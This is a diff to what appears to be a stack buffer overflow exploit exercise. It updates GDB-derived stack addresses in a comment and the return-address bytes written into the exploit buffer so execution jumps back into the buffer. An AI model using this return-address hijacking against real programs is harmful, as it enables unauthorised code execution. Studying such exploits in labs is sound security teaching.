@@ -17,19 +17,19 @@ main ( int argc, char * argv[] )
 	INFO FROM GDB:
 
 		% info frame (of foo)
-			Arglist at 0x2021feb0, args: arg=0x7fffffffefdc "hi there"
- 			Locals at 0x2021feb0, Previous frame's sp is 0x2021fec0
+			Arglist at 0x2021fe50, args: arg=0x7fffffffefdc "hi there"
+ 			Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
  			Saved registers:
-  			rbp at 0x2021feb0, rip at 0x2021feb8
+  			rbp at 0x2021fe50, rip at 0x2021fe58
 
   		% p &buf
-  			0x2021fda0
+  			0x2021fd40
 
   		% p &len
-			0x2021feac
+			0x2021fe4c
 	
 		% p &i
-			0x2021fea8
+			0x2021fe48
 
 		Difference between i and buf addresses is 264 bytes. We need to 
 		overwrite value of len.
@@ -59,7 +59,7 @@ main ( int argc, char * argv[] )
 
 	// fill the 4 bytes with buffer start address.
 		// we'll use envp argument to jump back here
-	exploit[252] = '\xa0';
+	exploit[252] = '\x40';
 	exploit[253] = '\xfd';
 	exploit[254] = '\x21';
 	exploit[255] = '\x20';
